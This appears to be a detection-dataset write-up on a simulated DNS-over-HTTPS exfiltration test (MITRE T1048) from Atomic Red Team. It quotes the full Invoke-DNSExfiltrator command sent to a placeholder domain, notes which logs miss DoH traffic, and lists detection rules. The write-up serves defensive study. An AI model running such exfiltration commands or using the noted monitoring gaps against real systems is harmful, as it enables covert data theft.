# T1048-3: Exfiltration Over Alternative Protocol — DNSExfiltration (doh)

## Technique Context

T1048 Exfiltration Over Alternative Protocol covers adversary use of protocols other than the typical command and control channel to steal data. DNS exfiltration is a popular variant where data is encoded into DNS queries, allowing covert data transfer through a protocol that's rarely blocked by network controls. DNS-over-HTTPS (DoH) adds another layer of obfuscation by tunneling DNS queries through encrypted HTTPS connections to public resolvers like Google (8.8.8.8) or Cloudflare.

The detection community typically focuses on unusual DNS query patterns (long subdomains, high entropy strings, excessive query volume to single domains), DNS traffic to non-corporate resolvers, and PowerShell scripts making DNS queries programmatically. DoH makes traditional DNS monitoring ineffective since queries appear as normal HTTPS traffic to public services.

## What This Dataset Contains

This dataset captures a PowerShell-based DNS exfiltration test using the DNSExfiltrator tool with DNS-over-HTTPS. The key evidence includes:

**PowerShell Script Block (EID 4104):** The actual exfiltration command is captured in script block logging: `Import-Module "C:\AtomicRedTeam\atomics\..\ExternalPayloads\dnsexfil.ps1"` followed by `Invoke-DNSExfiltrator -i "C:\AtomicRedTeam\atomics\..\ExternalPayloads\dnsexfil.ps1" -d target.example.com -p atomic -doh google -t 500`

**Process Creation (Security EID 4688):** Shows PowerShell spawning a child process with the full command line: `"powershell.exe" & {Import-Module \"C:\AtomicRedTeam\atomics\..\ExternalPayloads\dnsexfil.ps1\" Invoke-DNSExfiltrator -i \"C:\AtomicRedTeam\atomics\..\ExternalPayloads\dnsexfil.ps1\" -d target.example.com -p atomic -doh google -t 500}`

**Sysmon Process Creation (EID 1):** Confirms the PowerShell execution with identical command line arguments, showing the parent process chain from the initial PowerShell session.

**Image Loading Events (Sysmon EID 7):** Multiple .NET runtime DLLs loaded, including `System.Management.Automation.ni.dll` and networking components like `urlmon.dll`, indicating PowerShell's preparation for network operations.

**Process Access Events (Sysmon EID 10):** Shows PowerShell accessing child processes, typical of script execution frameworks.

## What This Dataset Does Not Contain

Crucially missing from this dataset are the actual network events that would show the DNS-over-HTTPS exfiltration in action. There are no Sysmon EID 22 (DNS Query) events, which suggests the DoH queries bypassed traditional DNS monitoring entirely. Similarly absent are EID 3 (Network Connection) events that might show HTTPS connections to Google's DoH endpoints.

The dataset also lacks any Windows Defender detections or blocks, despite the endpoint protection being active. This indicates the DNSExfiltrator tool either completed successfully or used techniques that didn't trigger behavioral detection rules.

File system events are minimal - only startup profile data creation is captured, with no evidence of the source file being read or temporary files created during the exfiltration process.

## Assessment

This dataset provides excellent visibility into the PowerShell execution layer of DNS exfiltration but limited insight into the actual network exfiltration behavior. The process telemetry and script block logging create strong detection opportunities for the technique's implementation, but the lack of network visibility demonstrates a key challenge in detecting DoH-based exfiltration.

The data quality is strong for PowerShell-focused detections but weak for network-based detection development. Organizations relying primarily on DNS query monitoring would struggle to detect this technique based solely on this telemetry.

## Detection Opportunities Present in This Data

1. **PowerShell Script Block Detection** - Alert on Import-Module commands loading scripts from external payload directories combined with DNS-related function calls like "Invoke-DNSExfiltrator"

2. **Suspicious PowerShell Command Line Arguments** - Detect PowerShell processes with command lines containing "doh" parameter combined with domain arguments and timing parameters

3. **External Payload Directory Access** - Monitor for PowerShell importing modules from non-standard locations like "ExternalPayloads" directories

4. **DNS Exfiltration Function Names** - Alert on PowerShell script blocks containing function names like "Invoke-DNSExfiltrator" or similar DNS manipulation functions

5. **PowerShell Network Library Loading** - Monitor for PowerShell processes loading urlmon.dll in conjunction with suspicious command line parameters

6. **Process Chain Analysis** - Detect PowerShell parent-child relationships where child processes contain encoding parameters (-p atomic) combined with domain targets

7. **DoH Parameter Detection** - Alert on command lines containing "-doh google" or similar DNS-over-HTTPS provider specifications in PowerShell contexts
